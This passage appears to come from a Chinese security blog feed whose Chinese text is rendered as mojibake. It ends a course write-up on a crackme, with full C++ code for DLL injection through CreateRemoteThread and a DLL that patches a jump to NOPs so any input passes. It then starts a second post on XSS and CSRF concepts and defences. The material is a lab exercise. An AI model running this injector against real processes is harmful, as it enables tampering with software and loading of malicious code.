‡è¿›ç¨‹ä¸­</span></span><br><span class="line"><span class="comment">//if (!hRemotehandle) &#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%p\t%p\t%p\t&quot;, hProcess, LoadLibraryAddr, pDLLAddr);</span></span><br><span class="line"><span class="comment">//DWORD dwError = GetLastError();</span></span><br><span class="line"><span class="comment">//printf(&quot;CreateRemoteThread is error. Error Code: %d\n&quot;, dwError);</span></span><br><span class="line"><span class="comment">//return false;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">HANDLE hRemotehandle = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, LoadLibraryAddr, pDLLAddr, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//åˆ›é€ è¿œç¨‹çº¿ç¨‹æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­</span></span><br><span class="line"><span class="keyword">if</span> (!hRemotehandle) &#123;</span><br><span class="line">DWORD dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line"></span><br><span class="line">LPVOID lpMsgBuf;</span><br><span class="line"><span class="built_in">FormatMessageA</span>(</span><br><span class="line">FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">dwError,</span><br><span class="line"><span class="number">0</span>, <span class="comment">// Default language</span></span><br><span class="line">(LPSTR)&amp;lpMsgBuf,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;CreateRemoteThread is error. Error Code: %d - %s\n&quot;, dwError, lpMsgBuf);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">LocalFree</span>(lpMsgBuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%p\t%p\t%p\t&quot;, hProcess, LoadLibraryAddr, pDLLAddr);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRemotehandle, INFINITE);<span class="comment">//ç­‰å¾…è¿”å›</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hRemotehandle);<span class="comment">//å…³é—­ç›®æ ‡è¿›ç¨‹å¥æŸ„</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;inject successfully!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find PID by name</span></span><br><span class="line"><span class="function">DWORD <span class="title">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"><span class="comment">//hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);</span></span><br><span class="line">hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">Process32First</span>(hSnapShot, &amp;pe);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))</span><br><span class="line">&#123;</span><br><span class="line">dwPID = pe.th32ProcessID;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line"><span class="keyword">return</span> dwPID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="dllæ–‡ä»¶ï¼šdllmain-cpp-ç”Ÿæˆdllmain-exe"><a href="#dllæ–‡ä»¶ï¼šdllmain-cpp-ç”Ÿæˆdllmain-exe" class="headerlink" title="dllæ–‡ä»¶ï¼šdllmain.cpp(ç”Ÿæˆdllmain.exe)"></a>dllæ–‡ä»¶ï¼šdllmain.cpp(ç”Ÿæˆdllmain.exe)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="string">&quot;DLL Inject Sucess&quot;</span>);</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;dll sucess&quot;</span>, <span class="string">&quot;dll sucess&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//åŠ è½½DLLæ—¶è¿è¡Œd</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH: </span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä½œä¸šç»“æœ"><a href="#ä½œä¸šç»“æœ" class="headerlink" title="ä½œä¸šç»“æœ"></a>ä½œä¸šç»“æœ</h4><ul><li>å°†ddlmain.cppç¼–è¯‘æˆ64ä½çš„dllæ–‡ä»¶(æ³¨æ„ä¸€å®šè¦æ˜¯64ä½)</li><li>å°†dllæ–‡ä»¶ç»å¯¹è·¯å¾„å¡«å…¥evil.cppä¸­</li><li>å°†evil.cppç¼–è¯‘æˆ64ä½çš„exeæ–‡ä»¶</li><li>åœ¨crackmeæ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œevil.exe</li><li>åˆ©ç”¨process HackeræŸ¥çœ‹æ”¹è¿›ç¨‹è°ƒç”¨Modules</li><li>å¯ä»¥çœ‹åˆ°dllæˆåŠŸæ³¨å…¥</li></ul><blockquote><p>æ³¨å…¥æˆåŠŸå¹¶å¼¹çª—</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231217014350255.png" alt="image-20231217014350255" style="zoom:33%;" /><blockquote><p>Process Hackersæˆªå›¾ï¼Œevil1.dllä¸ºæ¶æ„dll</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231217014435627.png" alt="image-20231217014435627" style="zoom: 33%;" /><h3 id="3-Hookç¨‹åº"><a href="#3-Hookç¨‹åº" class="headerlink" title="3.Hookç¨‹åº"></a>3.Hookç¨‹åº</h3><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><blockquote><p> dllæ³¨å…¥ä¹‹Hook</p></blockquote><h5 id="DLLæ³¨å…¥"><a href="#DLLæ³¨å…¥" class="headerlink" title="DLLæ³¨å…¥"></a>DLLæ³¨å…¥</h5><pre><code>åœ¨Windowsä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰è‡ªå·±ç§æœ‰çš„åœ°å€ç©ºé—´ã€‚å½“æˆ‘ä»¬ç”¨æŒ‡é’ˆæ¥å¼•ç”¨å†…å­˜çš„æ—¶å€™ï¼ŒæŒ‡é’ˆçš„å€¼è¡¨ç¤ºçš„æ˜¯è¿›ç¨‹è‡ªå·±çš„åœ°å€ç©ºé—´ä¸­çš„ä¸€ä¸ªå†…å­˜åœ°å€ã€‚è¿›ç¨‹ä¸èƒ½åˆ›å»ºä¸€ä¸ªæŒ‡é’ˆæ¥å¼•ç”¨å±äºå…¶ä»–è¿›ç¨‹çš„å†…å­˜ã€‚å› æ­¤ï¼Œå¦‚æœè¿›ç¨‹æœ‰ä¸€ä¸ªç¼ºé™·ä¼šè¦†ç›–éšæœºåœ°å€å¤„çš„å†…å­˜ï¼Œé‚£ä¹ˆè¿™ä¸ªç¼ºé™·ä¸ä¼šå½±å“åˆ°å…¶ä»–è¿›ç¨‹æ‰€ä½¿ç”¨çš„å†…å­˜ã€‚ç‹¬ç«‹çš„åœ°å€ç©ºé—´å¯¹å¼€å‘äººå‘˜å’Œç”¨æˆ·æ˜¯éå¸¸æœ‰åˆ©çš„ã€‚å¯¹å¼€å‘äººå‘˜æ¥è¯´ï¼Œç³»ç»Ÿæ›´æœ‰å¯èƒ½æ•è·é”™è¯¯çš„å†…å­˜è¯»/å†™ã€‚å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿå˜å¾—æ›´åŠ å¥å£®äº†ï¼Œå› ä¸ºä¸€ä¸ªåº”ç”¨ç¨‹åºçš„é”™è¯¯ä¸ä¼šå¯¼è‡´å…¶ä»–åº”ç”¨ç¨‹åºæˆ–æ“ä½œç³»ç»Ÿå´©æºƒã€‚æ‰€è°“DLLæ³¨å…¥å°±æ˜¯å°†ä¸€ä¸ªDLLæ”¾è¿›æŸä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´é‡Œï¼Œè®©å®ƒæˆä¸ºé‚£ä¸ªè¿›ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚å¯ä»¥é€šè¿‡å¾ˆå¤šç§æ–¹å¼æ¥å®ç°DLLæ³¨å…¥ã€‚    + ä½¿ç”¨æ³¨å†Œè¡¨æ¥æ³¨å…¥DLL    + ä½¿ç”¨Windows Hookæ¥æ³¨å…¥DLL     + ä½¿ç”¨è¿œç¨‹çº¿ç¨‹æ¥æ³¨å…¥DLL   --æœ¬é¢˜çš„è€ƒç‚¹    + ä½¿ç”¨æœ¨é©¬DLLæ¥æ³¨å…¥    + æŠŠDLLä½œä¸ºè°ƒè¯•å™¨æ¥æ³¨å…¥    + ä½¿ç”¨CreateProcessæ¥æ³¨å…¥ä»£ç </code></pre><p>æˆ‘ä»¬å·²ç»é€šè¿‡è¿œç¨‹æ³¨å…¥æŠŠæ¶æ„çš„dllæ³¨å…¥è¿›å»äº†ï¼Œä¸‹ä¸€æ­¥æ˜¯ç¼–å†™dllï¼Œä¿®æ”¹æºç¨‹åºé€»è¾‘ï¼Œä½¿å¾—æˆ‘ä»¬æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½è¿”å›æ­£ç¡®ã€‚</p><h5 id="HookæŠ€æœ¯"><a href="#HookæŠ€æœ¯" class="headerlink" title="HookæŠ€æœ¯"></a>HookæŠ€æœ¯</h5><p><strong>hookæŠ€æœ¯å°±æ˜¯è®©ç›®æ ‡å‡½æ•°åœ¨æ‰§è¡Œä¹‹å‰å…ˆæ‰§è¡Œä¸€æ®µæˆ‘ä»¬è‡ªå·±å†™çš„ä»£ç </strong></p><h4 id="æœ¬é¢˜"><a href="#æœ¬é¢˜" class="headerlink" title="æœ¬é¢˜"></a>æœ¬é¢˜</h4><p>IDAåˆ†æä»£ç åå‘ç°æœ€ç»ˆåˆ¤æ–­flagçš„éƒ¨åˆ†ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v33 );</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)v34 )</span><br><span class="line">  v35.m128i_i32[<span class="number">0</span>] = <span class="number">-872817740</span>;              <span class="comment">// é”™è¯¯</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v35.m128i_i32[<span class="number">0</span>] = <span class="number">-1879061547</span>;             <span class="comment">//æ­£ç¡®</span></span><br><span class="line">v35.m128i_i16[<span class="number">2</span>] = <span class="number">3338</span>;</span><br><span class="line">*(__int16 *)((<span class="type">char</span> *)v35.m128i_i16 + <span class="number">1</span>) ^= <span class="number">0x3736</span>u;</span><br><span class="line">v35.m128i_i8[<span class="number">3</span>] ^= <span class="number">0x38</span>u;</span><br><span class="line">v35.m128i_i8[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sub_7FF6422E1020</span>((__int64)&amp;v35, v34, <span class="number">-48</span>i64);     <span class="comment">//æ‰“å°å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>ceä¸­æ‰¾åˆ°ç›¸å…³çš„æ±‡ç¼–ä»£ç </p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219045931532.png" alt="image-20231219045931532" style="zoom: 33%;" /><p>äºæ˜¯æˆ‘ä»¬æœ‰ä¸¤ä¸ªæ€è·¯</p><ul><li>ä¿®æ”¹ifåˆ¤æ–­é€»è¾‘ï¼Œè®©åˆ¤æ–­ä¸€ç›´ä¸ºæ­£ç¡®</li><li>ä¿®æ”¹æœ€ç»ˆçš„è¾“å‡ºå‡½æ•°ï¼Œä¸€ç›´è¾“å‡ºæ­£ç¡®</li></ul><p>ç¬¬äºŒä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨minHookå®ç°ï¼Œå°†åŸæ¥çš„å‡½æ•°Hookä¸ºnewPrintfå‡½æ•°å°±è¡Œ</p><p>ç°ä¸»è¦å®ç°ç¬¬ä¸€ç§æ–¹æ³•</p><p>æŠŠifåˆ¤æ–­çš„é€»è¾‘åˆ æ‰å’Œè·³è½¬é”™è¯¯çš„jneæ”¹æˆnop</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219051036666.png" alt="image-20231219051036666" style="zoom:50%;" /><p>æœ€ç»ˆæ•ˆæœ</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219050607270.png" alt="image-20231219050607270" style="zoom: 50%;" /><p>ä½¿ç”¨ä»£ç å®ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHook</span><span class="params">(<span class="type">void</span>* pJNE)</span> </span>&#123;</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(pJNE, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect); </span><br><span class="line">    *(DWORD*)pJNE = <span class="number">0x90909090</span>; <span class="comment">// æ¢å…¥nop nop nop nop</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(pJNE, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">            HMODULE hCrackMe = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;crackme.exe&quot;</span>)); <span class="comment">//è·å¾—åŸºåœ°å€</span></span><br><span class="line">            <span class="keyword">if</span> (hCrackMe != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                HMODULE jneAddress = (HMODULE)((<span class="type">size_t</span>)hCrackMe + <span class="number">0x18E7</span>);</span><br><span class="line">                <span class="built_in">SetHook</span>((<span class="type">void</span>*)jneAddress);</span><br><span class="line">                <span class="built_in">OutputDebugString</span>(<span class="string">&quot;Hook Sucess&quot;</span>);</span><br><span class="line">                <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hook sucess&quot;</span>, <span class="string">&quot;Hook sucess&quot;</span>, MB_OK);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\school\TencentClass\T1&gt; E:\app\MinGW-w64\bin\x86_64-w64-mingw32-g++ -shared -o Hook.dll  hook.cpp</span><br><span class="line">PS E:\school\TencentClass\T1&gt; E:\app\MinGW-w64\bin\x86_64-w64-mingw32-g++  -o evil.exe evil.cpp</span><br></pre></td></tr></table></figure><h5 id="æœ€ç»ˆæ•ˆæœ"><a href="#æœ€ç»ˆæ•ˆæœ" class="headerlink" title="æœ€ç»ˆæ•ˆæœ"></a>æœ€ç»ˆæ•ˆæœ</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231219053305127.png" alt="image-20231219053305127" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€åœºXSSå’ŒCSRFå¼•å‘çš„è¡€æ¡ˆ</title>
      <link href="/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"/>
      <url>/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è®º"><a href="#æ¦‚è®º" class="headerlink" title="æ¦‚è®º"></a>æ¦‚è®º</h1><p>æœ¬æ–‡å‰åŠéƒ¨åˆ†ä»å››ä¸ªè§’åº¦è®¨è®ºXSSä¸CSRFçš„åŒºåˆ«ä¸å…±æ€§â€”â€”åŸç†ï¼Œåˆ©ç”¨ï¼Œç»•è¿‡ï¼Œé˜²å¾¡ã€‚æ›´å¤šçš„ç«™åœ¨é˜²å®ˆæ–¹çš„è§’åº¦ï¼Œé€šè¿‡å¯¹æ¯”å­¦ä¹ çš„æ–¹å¼æ›´åŠ è¾©è¯æ€§çš„ç†è§£ä¸¤ä¸ªæ¼æ´ã€‚ååŠéƒ¨åˆ†æ·±å…¥åˆ†æé˜²å¾¡XSSç­‰ä¸€ç³»åˆ—å‰ç«¯å®‰å…¨é—®é¢˜çš„æ–°æ€è·¯â€”â€”å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼Œä»¥åŠä¸€äº›ç¬”è€…å…³äºå‰ç«¯å®‰å…¨çš„ä¸€äº›æ€è€ƒã€‚</p><h1 id="æ¼æ´ç†è§£"><a href="#æ¼æ´ç†è§£" class="headerlink" title="æ¼æ´ç†è§£"></a>æ¼æ´ç†è§£</h1><h3 id="webå®‰å…¨åŸºç¡€"><a href="#webå®‰å…¨åŸºç¡€" class="headerlink" title="webå®‰å…¨åŸºç¡€"></a>webå®‰å…¨åŸºç¡€</h3><h4 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a><strong>åŒæºç­–ç•¥</strong></h4><p>ä»åŸŸå’Œæˆæƒè¿™ä¸¤ä¸ªæ¦‚å¿µç†è§£åŒæºç­–ç•¥ã€‚</p><ul><li>åŸŸåˆ†ä¸ºåŸŸåå’Œç«¯å£ä¸‰ä¸ªä¸éƒ¨åˆ†ã€‚åè®®ã€åŸŸåå’Œç«¯å£å¿…é¡»å…¨éƒ¨ç›¸åŒï¼Œæ‰å±äºåŒæº</li><li>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸åŒåŸŸä¹‹é—´æ˜¯ä¸èƒ½ç›¸äº’è®¿é—®èµ„æºçš„ã€‚åªæœ‰è¢«è®¿é—®åŸŸçš„å“åº”å¤´ä¸­åŒ…å«ç›¸å…³çš„originï¼Œæ‰ä¼šç»™ç›¸åº”çš„åŸŸæˆæƒè®¿é—®ã€‚å³é€šè¿‡originå¯ä»¥æ‹’ç»æˆæƒæŸäº›è·¨åŸŸè¯·æ±‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼šåŒæºç­–ç•¥åˆ†å‰²å’Œä¿æŠ¤äº†Web èµ„æºï¼Œé€šè¿‡é™åˆ¶éåŒåŸŸèµ„æºçš„è®¿é—®ï¼Œæœ‰æ•ˆçš„é˜»æ­¢äº†æ”»å‡»è€…çš„çªƒå–å’Œç ´åè¡Œä¸º</p><h4 id="Cookie-sessionæœºåˆ¶"><a href="#Cookie-sessionæœºåˆ¶" class="headerlink" title="Cookie&#x2F;sessionæœºåˆ¶"></a><strong>Cookie&#x2F;sessionæœºåˆ¶</strong></h4><p>è¿™ä¸¤ä¸ªæœºåˆ¶éƒ½æ˜¯å¸¸ç”¨çš„ä¼šè¯è·Ÿè¸ªæŠ€æœ¯ã€‚session æœºåˆ¶ä¸ Cookie æœºåˆ¶ä¸åŒçš„æ˜¯ï¼ŒCookie æ˜¯<strong>å®¢æˆ·ç«¯</strong>æœºåˆ¶ï¼Œè€Œ Session åˆ™æ˜¯<strong>æœåŠ¡ç«¯</strong>æœºåˆ¶ã€‚åœ¨å®é™… Web åº”ç”¨ä¸­ï¼Œä¼šè¯æœºåˆ¶é€šå¸¸ä½œä¸ºä¸€ç§è®¤è¯ç”¨æˆ·èº«ä»½çš„æ‰‹æ®µã€‚å› æ­¤ä¹Ÿæ˜¯å„å¤§æ”»å‡»åœºæ™¯ä¸­çš„é¦–è¦æ”»å‡»ç›®æ ‡ã€‚</p><hr><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼š<code>æ”»å‡»è€…è„šæœ¬</code> åµŒå…¥ <code>è¢«æ”»å‡»ç½‘ç«™</code>ï¼Œè·å–ç”¨æˆ·cookieç­‰éšç§ä¿¡æ¯ã€‚</p><p>æ”»å‡»è€…å¯¹å®¢æˆ·ç«¯ç½‘é¡µæ³¨å…¥çš„æ¶æ„è„šæœ¬ä¸€èˆ¬åŒ…æ‹¬ JavaScriptï¼Œæœ‰æ—¶ä¹Ÿä¼šåŒ…å« HTML å’Œ Flashã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„è„šæœ¬ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æœ‰å¾ˆå¤šç§æ–¹å¼è¿›è¡Œ XSS æ”»å‡»ï¼Œä½†å®ƒä»¬çš„å…±åŒç‚¹ä¸ºï¼šå°†ä¸€äº›éšç§æ•°æ®åƒ cookieã€session å‘é€ç»™æ”»å‡»è€…ï¼Œå°†å—å®³è€…é‡å®šå‘åˆ°ä¸€ä¸ªç”±æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼Œåœ¨å—å®³è€…çš„æœºå™¨ä¸Šè¿›è¡Œä¸€äº›æ¶æ„æ“ä½œã€‚</p><p>åˆ†ç±»ä¸»è¦æ˜¯ï¼šåå°„å‹ã€å­˜å‚¨å‹ã€DOMå‹</p><blockquote><p> åå°„å‹ï¼šåº”ç”¨ç¨‹åºä»è¯·æ±‚ä¸­è·å–ä¸€äº›è¾“å…¥å¹¶ä»¥ä¸å®‰å…¨çš„æ–¹å¼å°†è¯¥è¾“å…¥åµŒå…¥åˆ°<strong>å³æ—¶å“åº”</strong>ä¸­</p></blockquote><p>ç‰¹ç‚¹ï¼š</p><ul><li>å³æ—¶æ€§ã€‚ä¸ç»è¿‡æœåŠ¡å™¨å­˜å‚¨ï¼Œç›´æ¥é€šè¿‡ HTTP çš„ GET å’Œ POST è¯·æ±‚å°±èƒ½å®Œæˆä¸€æ¬¡æ”»å‡»ï¼Œæ‹¿åˆ°ç”¨æˆ·éšç§æ•°æ®ï¼›</li><li>æ”»å‡»è€…éœ€è¦è¯±éª—ç‚¹å‡»ï¼›</li><li>åé¦ˆç‡ä½ï¼Œæ‰€ä»¥è¾ƒéš¾å‘ç°å’Œå“åº”ä¿®å¤ï¼›</li><li>ç›—å–ç”¨æˆ·æ•æ„Ÿä¿å¯†ä¿¡æ¯</li></ul><blockquote><p>å­˜å‚¨å‹ï¼šæ”»å‡»è„šæœ¬å°†è¢«<strong>æ°¸ä¹…åœ°å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨</strong>ç«¯ï¼ˆæ•°æ®åº“ï¼Œå†…å­˜ï¼Œæ–‡ä»¶ç³»ç»Ÿç­‰ï¼‰</p></blockquote><p>ç‰¹ç‚¹ï¼š</p><ul><li>æŒä¹…æ€§ï¼Œæ¤å…¥åœ¨æ•°æ®åº“ä¸­ï¼›</li><li>å±å®³é¢å¹¿ï¼Œç”šè‡³å¯ä»¥è®©ç”¨æˆ·æœºå™¨å˜æˆ DDoS æ”»å‡»çš„è‚‰é¸¡ï¼›</li><li>ç›—å–ç”¨æˆ·æ•æ„Ÿç§å¯†ä¿¡æ¯ã€‚</li></ul><blockquote><p>DOMå‹ï¼šDOM XSSç›´æ¥é€šè¿‡javascriptæ‰§è¡Œï¼Œç¨‹åºå¹¶ä¸ä¼šè¿”å›åå°è¿›è¡Œå¤„ç†ã€‚</p></blockquote><p>ç‰¹ç‚¹ï¼š</p><ul><li>DOM xsså±äºæ˜¯å‰ç«¯çš„å®‰å…¨é—®é¢˜ï¼ŒæœåŠ¡ç«¯çš„é˜²å¾¡éƒ½æ— æ•ˆ</li><li>å’Œåå°„å‹ä¸€æ ·åªèƒ½é€šè¿‡è¯±å¯¼å—å®³è€…ç‚¹å‡»é“¾æ¥</li></ul><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><ul><li>å¤§å°å†™ç»•è¿‡</li><li>å¤å†™ç»•è¿‡</li><li>ä½¿ç”¨jsäº‹ä»¶ç»•è¿‡æ ‡ç­¾æ‹¬å·ç­‰</li><li>ç¼–ç ç»•è¿‡</li></ul><h4 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h4><ul><li><p>è®¾ç½®HttpOnlyæ ‡å¿—ï¼Œé˜²æ­¢éæ³•ç”¨æˆ·é€šè¿‡Javascriptè¯»å–cookie</p></li><li><p>Web é¡µé¢æ¸²æŸ“çš„æ‰€æœ‰å†…å®¹æˆ–è€…æ¸²æŸ“çš„æ•°æ®éƒ½å°½é‡æ¥è‡ªäºæœåŠ¡ç«¯ï¼›</p></li><li><p>å°½é‡ä¸è¦ä»  URLï¼Œdocument.referrerï¼Œdocument.forms ç­‰è¿™ç§ API ä¸­è·å–æ•°æ®ç›´æ¥æ¸²æŸ“ï¼›</p></li><li><p>å‰ç«¯æ¸²æŸ“çš„æ—¶å€™å¯¹å­—æ®µåšè½¬ä¹‰ç¼–ç 